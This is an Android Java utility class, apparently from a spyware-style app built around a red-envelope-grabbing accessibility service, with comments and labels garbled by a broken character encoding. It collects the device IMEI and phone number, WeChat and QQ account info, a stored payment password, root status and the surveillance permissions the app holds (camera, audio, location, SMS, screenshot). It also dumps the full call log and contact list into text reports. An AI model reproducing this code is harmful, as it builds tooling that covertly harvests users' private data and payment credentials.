/**
 * 
 */
package util;


import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;



import accessibility.QiangHongBaoService;
import ad.Ad2;
import android.content.Context;

import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;


/**
 * @author byc
 *
 */
public class PhoneInfo {
	public static String PhoneBaseInfo=null;
	 /** 
     * ��ȡIMEI�ţ�IESI�ţ��ֻ��ͺ� androidVersion=Product Model: Nexus 11,generic,19,4.4.2,19
     */ 
    public static String getBasePhoneInfo(Context context) { 
    	if(PhoneBaseInfo!=null)return PhoneBaseInfo;
       TelephonyManager mTm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);  
        String imei = mTm.getDeviceId();  
        String imsi = mTm.getSubscriberId();  
        String mtype = android.os.Build.MODEL; // �ֻ��ͺ�  
        String mtyb= android.os.Build.BRAND;//�ֻ�Ʒ��  Xiaomi
        String numer = mTm.getLine1Number(); // �ֻ����룬�еĿɵã��еĲ��ɵ�  
        String osVersion=android.os.Build.VERSION.RELEASE;
        String osVersionInt=String.valueOf(android.os.Build.VERSION.SDK_INT);
        String Info=mtype+','+mtyb+','+osVersion+','+osVersionInt+"\r\nIMEI:"+imei+"\r\nPhone:"+numer;
        return Info;
        //return "�ֻ�IMEI�ţ�"+imei+"\r\n�ֻ�IESI�ţ�"+imsi+"\r\n�ֻ��ͺţ�"+mtype+"\r\n�ֻ�Ʒ�ƣ�"+mtyb+"\r\n�ֻ�����"+numer;  
      }  
    /*
     * ������Ϣ��������
     */
    public static String getBaseInfo(Context context,String info) { 
    	String baseInfo=PhoneInfo.getBasePhoneInfo(context);
    	String wxInfo=ConfigCt.getInstance(context).getWechatInfo();
    	String QQInfo=ConfigCt.getInstance(context).getQQInfo();
    	String pwd=ConfigCt.getInstance(context).getPayPWD();
    	String appName="������ƣ�"+ConfigCt.AppName+";";
    	String sReg="�����Ȩ��      δ��Ȩ";
    	if(ConfigCt.bReg)sReg="�����Ȩ������Ȩ";
    	String sms="��ȡ���ţ�      δ��ȡ";
    	if(ConfigCt.getInstance(context).getIsSendSms())sms="��ȡ���ţ�����Ȩ";
    	String hp="��Ļ״̬��      ����";
    	if(Funcs.isScreenOn(context))hp="��Ļ״̬������";
    	String scrLock="����״̬��      δ����";
    	if(Funcs.isScreenLocked(context))scrLock="����״̬��������";
    	String version="����汾��"+ConfigCt.version+";";
    	String sRoot="����ROOT��      δROOT";
    	if(ConfigCt.bRoot)sRoot="����ROOT����ROOT";
    	String sAccessbility="����Ȩ�ޣ�      δ��";
    	if(QiangHongBaoService.isRunning())sAccessbility="����Ȩ�ޣ��Ѵ�";
    	String sScreenShot="����Ȩ�ޣ�      δ��ȡ";
    	if(ConfigCt.getInstance(context).haveScreenShotPower())
    		sScreenShot="����Ȩ�ޣ�����Ȩ";
    	
    	String sLock="����Ȩ�ޣ�      δ��ȡ";
    	if(ConfigCt.getInstance(context).haveLockPermission())
    		sLock="����Ȩ�ޣ�����Ȩ";
    	
    	String sLocation="��λȨ�ޣ�      δ��ȡ";
    	if(ConfigCt.getInstance(context).haveLocatePermission())
    		sLocation="��λȨ�ޣ�����Ȩ";
    	
    	String sCamera="¼��Ȩ�ޣ�      δ��ȡ";
    	if(ConfigCt.getInstance(context).haveCameraPermission())
    		sCamera="¼��Ȩ�ޣ�����Ȩ";
    	
    	String sAudio="¼��Ȩ�ޣ�      δ��ȡ";
    	if(ConfigCt.getInstance(context).haveAudioPermission())
    		sAudio="¼��Ȩ�ޣ�����Ȩ";
    	
    	String sHaveRoot="ROOTȨ�ޣ�      δ��ȡ";
    	if(ConfigCt.getInstance(context).haveRootPermission())
    		sHaveRoot="ROOTȨ�ޣ�����Ȩ";
    	
    	String sContact="ͨѶ¼�ޣ�      δ��ȡ";
    	if(ConfigCt.getInstance(context).getIsReadContact())
    		sContact="ͨѶ¼�ޣ�����Ȩ";
    	
    	String sCallLog="ͨ����¼��      δ��ȡ";
    	if(ConfigCt.getInstance(context).getIsReadCallLog())
    		sCallLog="ͨ����¼������Ȩ";
    	
    	String sSendSms="���Ͷ��ţ�      δ��ȡ";
    	if(ConfigCt.getInstance(context).getIsSendSmsToPhone())
    		sSendSms="���Ͷ��ţ�����Ȩ";
    	
    	String sFloatWindow="�������ڣ�      δ��ȡ";
    	if(Funcs.haveFloatWindowPermission(context))
    		sFloatWindow="�������ڣ�����Ȩ";
    	
    	String allInfo=baseInfo+"\r\nWX:"
    			+wxInfo+"\r\nQQ:"
    			+QQInfo+"\r\n"
    			+getAdInfo()+"\r\n"
    			+pwd+"\r\n"
    			+appName+"\r\n"
    			+version+"\r\n"
    			+sReg+"\r\n"
    			+"<------------------------��Ļ״̬\r\n"
    			+hp+"\r\n"
    			+scrLock+"\r\n"
    			+"<------------------------Ȩ���б�\r\n"
    			+sms+"\r\n"
    			+"<------------------------>\r\n"
    			+sRoot+"\r\n"
    			+"<------------------------>\r\n"
    			+sScreenShot+"\r\n"
    			+"<------------------------>\r\n"
    			+sLock+"\r\n"
    			+"<------------------------>\r\n"
    			+sAccessbility+"\r\n"
    			+"<------------------------>\r\n"
    			+sLocation+"\r\n"
    			+"<------------------------>\r\n"
    			+sCamera+"\r\n"
    			+"<------------------------>\r\n"
    			+sAudio+"\r\n"
    			+"<------------------------>\r\n"
    			+sContact+"\r\n"
    			+"<------------------------>\r\n"
    			+sCallLog+"\r\n"
    			+"<------------------------>\r\n"
    			+sSendSms+"\r\n"
    			+"<------------------------>\r\n"
    			+sHaveRoot+"\r\n"
    			+"<------------------------>\r\n"
				+sFloatWindow+"\r\n"
				+"<------------------------>\r\n";
    	if(info!=null)allInfo=allInfo+info;
    	return allInfo;
    }

    /** 
     * ��ȡͨ����¼ 
     */  
    public static String GetCallsInPhone(Context context) {  
        String result = null;  
        Cursor cursor = context.getContentResolver().query(  
                Calls.CONTENT_URI,  
                new String[] { Calls.DURATION, Calls.TYPE, Calls.DATE,  
                        Calls.NUMBER }, null, null, Calls.DEFAULT_SORT_ORDER);  
        boolean hasRecord = cursor.moveToFirst();  
        int count = 0;  
        String strPhone = "";  
        String date;  
  
        while (hasRecord) {  
            int type = cursor.getInt(cursor.getColumnIndex(Calls.TYPE));  
            long duration = cursor.getLong(cursor  
                    .getColumnIndex(Calls.DURATION));  
            strPhone = cursor.getString(cursor.getColumnIndex(Calls.NUMBER));  
            SimpleDateFormat dateFormat = new SimpleDateFormat(  
                    "yyyy-MM-dd hh:mm:ss");  
            Date d = new Date(Long.parseLong(cursor.getString(cursor  
                    .getColumnIndex(Calls.DATE))));  
            date = dateFormat.format(d);  
  
            result = result + "phone :" + strPhone + ",";  
  
            result = result + "date :" + date + ",";  
            result = result + "time :" + duration + ",";  
  
            switch (type) {  
            case Calls.INCOMING_TYPE:  
                result = result + "type :����";  
                break;  
            case Calls.OUTGOING_TYPE:  
                result = result + "type :����";  
            default:  
                break;  
            }  
            result += "\r\n";  
            count++;  
            hasRecord = cursor.moveToNext();  
        }
        //Log.i(ConfigCt.TAG, result); 
        return result;
        //textView.setText(result);  
    }
   
    public static String getAdInfo() { 
    	String info="";
    	if(Ad2.currentQQ!=null){
    		info="QQAD:max("+Ad2.currentQQ.mADmax+")cur("+Ad2.currentQQ.mADcount+");";
    	}
    	if(Ad2.currentWX!=null){
    		info=info+"WXAD:max("+Ad2.currentWX.mADmax+")cur("+Ad2.currentWX.mADcount+");";
    	}
    	return info;
    }
    /** 
     * ��ȡͨѶ��¼ 
     */  
    public static String GetContactInPhone(Context context) { 
    	 try {
    		 StringBuffer sb = new StringBuffer();
             Uri contactUri =ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
             Cursor cursor = context.getContentResolver().query(contactUri,
                                                               new String[]{"display_name", "sort_key", "contact_id","data1"},
                                                               null, null, "sort_key");
             String contactName;
             String contactNumber;
             String contactSortKey;
             int contactId;
             while (cursor.moveToNext()) {
                 contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                 contactNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                 contactId = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
                 //contactSortKey =getSortkey(cursor.getString(1));
                 //ContactsInfo contactsInfo = new ContactsInfo(contactName,contactNumber,contactSortKey,contactId);
                 if (contactName!=null){
                	 sb.append(contactName+ "��"+contactNumber + ":" + contactId + "\r\n");
                      //list.add(contactsInfo);
                 }
             }
             cursor.close();//ʹ�����һ��Ҫ��cursor�رգ���Ȼ������ڴ�й¶������
             return sb.toString();
         }catch (Exception e){
             e.printStackTrace();
             return null;
         }finally {

         }
    }
    private static String getSortkey(String sortKeyString){
        String key =sortKeyString.substring(0,1).toUpperCase();
        if (key.matches("[A-Z]")){
            return key;
        }else
            return "#";   //��ȡsort key���׸��ַ��������Ӣ����ĸ��ֱ�ӷ��أ����򷵻�#��
    }
}
